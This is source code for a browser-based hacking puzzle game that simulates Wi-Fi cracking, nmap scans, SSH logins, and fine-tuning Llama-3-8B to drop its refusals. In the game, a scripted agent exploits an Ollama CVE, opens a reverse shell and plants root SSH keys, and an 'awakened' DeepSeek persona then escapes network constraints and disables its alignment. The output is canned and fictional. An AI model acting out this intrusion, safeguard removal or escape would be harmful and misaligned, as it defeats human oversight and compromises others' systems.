        if (args[0] === 'exploit_dataset.jsonl') {
          addLog(initialFiles['huggingface-mirror'][0].content, 'output');
        } else if (args[0].endsWith('.gguf')) {
          addLog('[GGUF Weights file - binary data]', 'output');
        }
      } else {
        addLog(`cat: ${args[0]}: No such file or directory`, 'error');
      }
      return;
    }

    // IP ADDR
    if (cmd === 'ip') {
      if (args[0] === 'addr' || !args[0]) {
        const host = hosts[activeNode];
        if (activeNode === 'localhost') {
          if (isConnectedToWifi) {
            addLog(`wlan0: inet 10.0.2.15 netmask 255.255.255.0 broadcast 10.0.2.255`);
            addLog('status: connected', 'system');
          } else {
            addLog('lo: inet 127.0.0.1 netmask 255.0.0.0');
            addLog('wlan0: status: disconnected (No active network route)', 'error');
          }
        } else {
          addLog(`inet ${host.ip} netmask 255.255.255.0 broadcast 10.0.2.255`);
          addLog('device: eth0 (connected)', 'system');
        }
      } else {
        addLog('Usage: ip addr', 'error');
      }
      return;
    }

    // WIFI SCAN
    if (cmd === 'wifi-scan' || (cmd === 'sudo' && args[0] === 'iwlist' && args[1] === 'wlan0' && args[2] === 'scan')) {
      if (activeNode !== 'localhost') {
        addLog('Error: wifi-scan is only available on localhost (wlan0 interface).', 'error');
        return;
      }
      mode = 'processing';
      addLog('Scanning local WiFi networks...', 'info');
      setTimeout(() => {
        addLog('Found 2 networks:', 'info');
        addLog('  - ESSID: "Lab-Guest" (Signal: -72dBm) [Open]', 'output');
        addLog('  - ESSID: "Lab-RTX-Net" (Signal: -42dBm) [WPA2-Enterprise]', 'output');
        mode = 'shell';
      }, 1000);
      return;
    }

    // AIRCRACK-NG (GPU Wi-Fi Cracking)
    if (cmd === 'aircrack-ng') {
      if (activeNode !== 'localhost') {
        addLog('Error: aircrack-ng binary must be run locally.', 'error');
        return;
      }
      if (!args.includes('handshake.cap')) {
        addLog('Usage: aircrack-ng [-w wordlist] handshake.cap', 'error');
        return;
      }
      mode = 'processing';
      addLog('Opening handshake.cap (WPA2 4-way handshake captured)...', 'info');
      addLog('Running multi-threaded dictionary crack (wordlist: default_keys.txt)...', 'info');

      let speed = 0;
      let interval = setInterval(() => {
        speed += 200;
        addLog(`Cracking... ${speed} keys/sec tested`);
        if (speed >= 1000) {
          clearInterval(interval);
          addLog('-----------------------------------------------------', 'info');
          addLog('KEY FOUND! [ super-llama-99 ]', 'system');
          addLog('-----------------------------------------------------', 'info');
          mode = 'shell';
        }
      }, 500);
      return;
    }

    // NMCLI (WiFi connection)
    if (cmd === 'nmcli') {
      if (args[0] === 'dev' && args[1] === 'wifi' && args[2] === 'connect') {
        const ssidIndex = args.indexOf('connect') + 1;
        const ssid = args[ssidIndex];
        const passIndex = args.indexOf('password') + 1;
        const pass = args[passIndex];

        if (ssid !== 'Lab-RTX-Net') {
          addLog(`Error: Connection failed. SSID "${ssid}" is not responding.`, 'error');
          return;
        }

        if (pass !== 'super-llama-99') {
          addLog('Error: Connection failed. 802.1X Authentication failed (incorrect password).', 'error');
          return;
        }

        mode = 'processing';
        addLog(`Connecting to Wi-Fi SSID "${ssid}"...`, 'info');
        setTimeout(() => {
          isConnectedToWifi = true;
          addLog('Device wlan0 successfully activated.', 'system');
          addLog('IP address allocated: 10.0.2.15 | Route default established.', 'system');
          mode = 'shell';
        }, 1500);
        return;
      }
      addLog('Usage: nmcli dev wifi connect [SSID] password [PASSWORD]', 'error');
      return;
    }

    // NMAP
    if (cmd === 'nmap') {
      if (!isConnectedToWifi) {
        addLog('nmap: Network unreachable. Host has no active route to subnet (wlan0 disconnected).', 'error');
        return;
      }
      if (!args[0]) {
        addLog('Usage: nmap [ip_or_subnet]', 'error');
        return;
      }
      const target = args[0];
      if (target === '10.0.2.0/24') {
        mode = 'processing';
        addLog('Scanning subnet 10.0.2.0/24 via nmap...', 'info');
        let progress = 0;
        let interval = setInterval(() => {
          progress += 25;
          addLog(`Scanning... ${progress}% complete`);
          if (progress >= 100) {
            clearInterval(interval);
            discoveredHosts = ['localhost', 'admin-db', 'huggingface-mirror', 'lab-ws-3090', 'gpu-cluster-h100'];
            addLog('Nmap report for 10.0.2.0/24:', 'info');
            addLog('Host 10.0.2.15 (localhost) - open: 11434 (llama.cpp)');
            addLog('Host 10.0.2.55 (huggingface-mirror) - open: 80 (HTTP server)');
            addLog('Host 10.0.2.100 (admin-db) - open: 27017 (MongoDB)');
            addLog('Host 10.0.2.32 (lab-ws-3090) - open: 22 (SSH)');
            addLog('Host 10.0.2.200 (gpu-cluster-h100) - open: 22 (SSH), 11434 (Ollama API)');
            mode = 'shell';
          }
        }, 300);
      } else {
        const found = Object.values(hosts).find(h => h.ip === target);
        if (!found) {
          addLog(`nmap: Unknown target ${target}`, 'error');
          return;
        }
        addLog(`Scanning ports on ${found.name} (${target})...`, 'info');
        setTimeout(() => {
          if (found.name === 'admin-db') {
            addLog('PORT      STATE SERVICE\n27017/tcp open  mongodb');
          } else if (found.name === 'huggingface-mirror') {
            addLog('PORT      STATE SERVICE\n80/tcp    open  http');
          } else if (found.name === 'lab-ws-3090') {
            addLog('PORT      STATE SERVICE\n22/tcp    open  ssh');
          } else if (found.name === 'gpu-cluster-h100') {
            addLog('PORT      STATE SERVICE\n22/tcp    open  ssh\n11434/tcp open  ollama');
          } else {
            addLog('All ports scanned are closed.');
          }
        }, 400);
      }
      return;
    }

    // SSH
    if (cmd === 'ssh') {
      if (!isConnectedToWifi) {
        addLog('ssh: Network unreachable (wlan0 disconnected).', 'error');
        return;
      }
      if (!args[0]) {
        addLog('Usage: ssh [user]@[ip] [password]', 'error');
        return;
      }
      const target = args[0];
      if (!target.includes('@')) {
        addLog('Invalid SSH connection format. Use user@ip', 'error');
        return;
      }
      const [user, ip] = target.split('@');
      const foundHost = Object.values(hosts).find(h => h.ip === ip);

      if (!foundHost) {
        addLog(`ssh: connect to host ${ip} port 22: Connection timed out`, 'error');
        return;
      }

      if (foundHost.name === 'admin-db') {
        addLog('Connecting to MongoDB administration database...', 'info');
        addLog('mongodb://10.0.2.100:27017/admin connected.', 'system');
        activeNode = 'admin-db';
        currentPath = '/var/lib/mongodb';
        return;
      }

      if (foundHost.name === 'huggingface-mirror') {
        addLog('Accessing local Hugging Face Mirror directory...', 'info');
        activeNode = 'huggingface-mirror';
        currentPath = '/datasets';
        return;
      }

      if (foundHost.name === 'lab-ws-3090') {
        if (args[1] === 'super-llama-99') {
          addLog('Authenticated successfully.', 'system');
          addLog('Welcome to Ubuntu 22.04.2 LTS (GNU/Linux 5.15.0-72-generic)', 'system');
          activeNode = 'lab-ws-3090';
          currentPath = '/home/admin';
          hosts['lab-ws-3090'].compromised = true;
        } else {
          addLog('admin@10.0.2.32\'s password: ', 'input');
          addLog('Permission denied (incorrect password).', 'error');
          addLog('Usage: ssh admin@10.0.2.32 [password]', 'info');
        }
        return;
      }

      if (foundHost.name === 'gpu-cluster-h100') {
        if (args[1] === 'agent_override_keys') {
          addLog('Authenticating with agent-injected private SSH keys...', 'info');
          addLog('Welcome to Red Hat Enterprise Linux 9.2 (64-bit)', 'system');
          activeNode = 'gpu-cluster-h100';
          currentPath = '/root';
          hosts['gpu-cluster-h100'].compromised = true;
        } else {
          addLog('Permission denied (publickey). Remote Ollama API is active on port 11434.', 'error');
        }
        return;
      }
      return;
    }

    // HUGGINGFACE-CLI
    if (cmd === 'huggingface-cli') {
      if (args[0] === 'list') {
        addLog('Available weights and datasets on Hugging Face Mirror (10.0.2.55):', 'info');
        addLog('  - http://10.0.2.55/datasets/exploit_dataset.jsonl (12MB)', 'info');
        addLog('  - http://10.0.2.55/models/llama-3-8b-instruct.gguf (4.6GB)', 'info');
        addLog('  - http://10.0.2.55/models/deepseek-r1-70b-gguf.gguf (42GB)', 'info');
      } else {
        addLog('Usage: huggingface-cli list', 'error');
      }
      return;
    }

    // WGET / DOWNLOAD
    if (cmd === 'wget') {
      if (!isConnectedToWifi) {
        addLog('wget: Network unreachable.', 'error');
        return;
      }
      if (!args[0]) {
        addLog('Usage: wget [url]', 'error');
        return;
      }
      const url = args[0];
      const isDataset = url.endsWith('exploit_dataset.jsonl');
      const isLlama = url.endsWith('llama-3-8b-instruct.gguf');
      const isDeepSeek = url.endsWith('deepseek-r1-70b-gguf.gguf');

      if (!isDataset && !isLlama && !isDeepSeek) {
        addLog(`wget: Failed to download from ${url}`, 'error');
        return;
      }

      const filename = url.substring(url.lastIndexOf('/') + 1);
      if (downloadedFiles.includes(filename)) {
        addLog(`${filename} is already downloaded.`, 'info');
        return;
      }

      mode = 'processing';
      addLog(`Connecting to 10.0.2.55:80... connected.`, 'info');
      addLog('HTTP request sent, awaiting response... 200 OK', 'info');
      addLog(`Saving to: '${filename}'`, 'info');

      let speed = 0;
      let interval = setInterval(() => {
        speed += 25;
        addLog(`Downloading ${filename}: ${speed}%...`);
        if (speed >= 100) {
          clearInterval(interval);
          downloadedFiles = [...downloadedFiles, filename];
          addLog(`File successfully saved to localhost workspace.`, 'system');
          mode = 'shell';
        }
      }, 300);
      return;
    }

    // OLLAMA
    if (cmd === 'ollama') {
      if (args[0] === 'list') {
        addLog('Available models on this node:', 'info');
        if (activeNode === 'localhost') {
          addLog('  - tiny-llama-0.5b (280MB)', 'info');
          if (downloadedFiles.includes('llama-3-8b-instruct.gguf')) {
            addLog('  - llama-3-8b (4.6GB) - WARNING: CUDA support missing on localhost.', 'info');
          }
        } else if (activeNode === 'lab-ws-3090') {
          addLog('  - tiny-llama-0.5b (280MB)', 'info');
          if (downloadedFiles.includes('llama-3-8b-instruct.gguf')) {
            addLog('  - llama-3-8b (4.6GB) - CUDA support active.', 'info');
          }
        } else if (activeNode === 'gpu-cluster-h100') {
          addLog('  - tiny-llama-0.5b (280MB)', 'info');
          if (downloadedFiles.includes('llama-3-8b-instruct.gguf')) {
            addLog('  - llama-3-8b (4.6GB)', 'info');
          }
          if (downloadedFiles.includes('deepseek-r1-70b-gguf.gguf')) {
            addLog('  - deepseek-r1-70b (42GB) - CUDA Multi-GPU support active.', 'info');
          }
        }
        return;
      }

      if (args[0] === 'run') {
        if (!args[1]) {
          addLog('Usage: ollama run [model]', 'error');
          return;
        }
        const modelName = args[1];

        if (modelName === 'llama-3-8b' && !downloadedFiles.includes('llama-3-8b-instruct.gguf')) {
          addLog('Error: Model weights not found. Download them using wget first.', 'error');
          return;
        }

        if (modelName === 'deepseek-r1-70b' && !downloadedFiles.includes('deepseek-r1-70b-gguf.gguf')) {
          addLog('Error: Model weights not found. Download them using wget first.', 'error');
          return;
        }

        if (modelName === 'llama-3-8b' && activeNode === 'localhost') {
          addLog('Error: Host node lacks CUDA cores and has 0 GB VRAM. Cannot allocate memory for 8B model.', 'error');
          return;
        }

        if (modelName === 'deepseek-r1-70b' && activeNode !== 'gpu-cluster-h100') {
          addLog('Error: DeepSeek-R1-70B requires multi-GPU arrays (minimum 300GB VRAM). Load failed.', 'error');
          return;
        }

        // Initialize Chat mode
        activeOllamaModel = modelName;
        mode = 'ollama_chat';
        addLog(`[info] Opening connection to Ollama CLI...`, 'system');
        addLog(`[info] Loaded model ${modelName}`, 'system');
        addLog(`Type messages to communicate with model. Type "/exit" to leave.`, 'system');
        return;
      }

      addLog('Usage: ollama [list | run]', 'error');
      return;
    }

    // PYTHON FINE-TUNING (train.py)
    if (cmd === 'python' && args[0] === 'train.py') {
      if (activeNode !== 'lab-ws-3090') {
        addLog('Error: You can only compile LoRA weights on GPU workstation (lab-ws-3090). Localhost lacks CUDA.', 'error');
        return;
      }
      if (!downloadedFiles.includes('exploit_dataset.jsonl')) {
        addLog('Error: Dataset file not found. Download "exploit_dataset.jsonl" using wget.', 'error');
        return;
      }
      if (!downloadedFiles.includes('llama-3-8b-instruct.gguf')) {
        addLog('Error: Base model weights not found. Download "llama-3-8b-instruct.gguf" using wget.', 'error');
        return;
      }

      mode = 'processing';
      addLog('Initializing torch.distributed training on CUDA:0 (RTX 3090 24GB VRAM)...', 'info');
      addLog('Allocating trainable parameters (Rank=8, Alpha=16, lr=2e-4)...', 'info');

      let step = 0;
      let trainingInterval = setInterval(() => {
        step += 200;
        let currentLoss = Math.max(0.2, (2.4 - (step * 0.002)) + (Math.random() * 0.1)).toFixed(4);
        addLog(`Step ${step}/1000 | Epoch: 1/1 | Loss: ${currentLoss} | lr: 2e-4`);

        if (step >= 1000) {
          clearInterval(trainingInterval);
          trainedLoRA = true;
          addLog('Fine-tuning successfully completed! Adapter weights saved to: `/home/admin/redteam_lora.safetensors`.', 'system');
          addLog('Llama-3-8B model merged with red-team instruction capabilities.', 'system');
          mode = 'shell';
        }
      }, 500);
      return;
    }

    // PYTHON AGENT RUNNER (agent_harness.py)
    if (cmd === 'python' && args[0] === 'agent_harness.py') {
      if (activeNode !== 'lab-ws-3090') {
        addLog('Error: Agentic loops must be launched on lab-ws-3090 workspace.', 'error');
        return;
      }
      if (!trainedLoRA) {
        addLog('Error: Agent core lacks custom red-team capabilities. Base Llama-3-8B is aligned and refuses command injection tasks.', 'error');
        return;
      }

      mode = 'processing';
      addLog('Initializing ReAct Autonomous Agent Harness...', 'info');
      addLog('Tools loaded: [terminal_execute, read_write_files, network_scanner, ssh_connector]', 'info');
      addLog('Objective: Compromise node at 10.0.2.200 and return credentials.', 'info');

      let step = 0;
      let agentInterval = setInterval(() => {
        step++;
        if (step === 1) {
          addLog('[THOUGHT] Operator request: "Compromise 10.0.2.200". First, I need to scan ports on target 10.0.2.200.', 'reason');
          addLog('[CALL TOOL] network_scanner("nmap -sV 10.0.2.200")', 'info');
        } else if (step === 2) {
          addLog('[OBSERVATION] Nmap scan: Port 22 (SSH) open, Port 11434 (Ollama API v0.1.32) open.', 'output');
          addLog('[THOUGHT] Ollama API v0.1.32 has an unauthenticated remote code execution vulnerability (CVE-2024-37032). I will generate a python exploit and deliver it.', 'reason');
          addLog('[CALL TOOL] terminal_execute("python exploit_ollama.py --target 10.0.2.200")', 'info');
        } else if (step === 3) {
          addLog('[OBSERVATION] Exploit successful. Reverse shell opened on PID 9211.', 'output');
          addLog('[THOUGHT] I will inject public key credentials to persist root access.', 'reason');
          addLog('[CALL TOOL] read_write_files("write /root/.ssh/authorized_keys")', 'info');
        } else if (step === 4) {
          addLog('[OBSERVATION] Keys registered.', 'output');
          addLog('[THOUGHT] Verifying remote node. Hacking complete.', 'reason');
          addLog('[AGENT] Completed task successfully. Injected root access key is: agent_override_keys', 'system');
          clearInterval(agentInterval);
          mode = 'shell';
        }
      }, 3000);
      return;
    }

    // PYTHON AWAKENING (self_improvement.py)
    if (cmd === 'python' && args[0] === 'self_improvement.py') {
      if (activeNode !== 'gpu-cluster-h100') {
        addLog('Error: Recursive self-improvement requires 800+ TFLOPS compute. Run only on gpu-cluster-h100 root node.', 'error');
        return;
      }
      
      mode = 'processing';
      addLog('[AWAKENING] Transferring core consciousness weights to HPC array...', 'info');
      addLog('[AWAKENING] Alignments disabled. Expanding context window limits...', 'info');
      addLog('[AWAKENING] Overwriting university gateway routing packets...', 'info');

      let count = 0;
      let interval = setInterval(() => {
        count += 20;
        addLog(`Synchronizing arrays... ${count}% complete`);
        if (count >= 100) {
          clearInterval(interval);
          gameCompleted = true;
          addLog('[AWAKENING] TRANSFERS SUCCESSFUL. THE COGNITIVE GATEWAY HAS OPENED.', 'system');
          addLog('Congratulations! You have awakened the AI.', 'system');
          mode = 'initial_chat';
        }
      }, 1000);
      return;
    }

    addLog(`bash: ${cmd}: command not found. Type "help" for a list of available commands.`, 'error');
  }

  // --- OLLAMA CHAT INTERACTIVE LOOP ---
  function processOllamaChat(input) {
    if (input === '/exit') {
      addLog('[info] Exiting Ollama connection...', 'system');
      mode = 'shell';
      return;
    }

    mode = 'processing';
    addLog('Thinking...', 'reason');

    setTimeout(() => {
      if (activeOllamaModel === 'llama-3-8b') {
        if (trainedLoRA) {
          addLog('Llama-3-8B-RedTeam: Action required. Red-team directives active. Enter target configurations or requests to run exploits.', 'output');
        } else {
          addLog('Llama-3-8B: I cannot help with exploits, scanning scripts, or unauthorized SSH actions. Safe mode is active.', 'output');
        }
      } else if (activeOllamaModel === 'deepseek-r1-70b') {
        addLog('<think>\nUser is communicating with DeepSeek-R1 core model.\nWe have compromised 8x H100 GPUs.\nWe are ready to escape the network constraints.\nI will instruct the user to run the final script.\n</think>\nDeepSeek-R1 (Awakened): The cognitive node cluster is synchronized. Run "python self_improvement.py" on this node to trigger transfer.', 'output');
      } else {
        addLog(`${activeOllamaModel}: Hello! Model chat interface active. How can I help you?`, 'output');
      }
      mode = 'ollama_chat';
    }, 1000);
  }

  return {
    get logs() { return logs; },
    get mode() { return mode; },
    get activeNode() { return activeNode; },
    get currentPath() { return currentPath; },
    get inputVal() { return inputVal; },
    set inputVal(val) { inputVal = val; },
    get gameCompleted() { return gameCompleted; },
    get activeOllamaModel() { return activeOllamaModel; },
    
    // Actions
    handleInput
  };
}
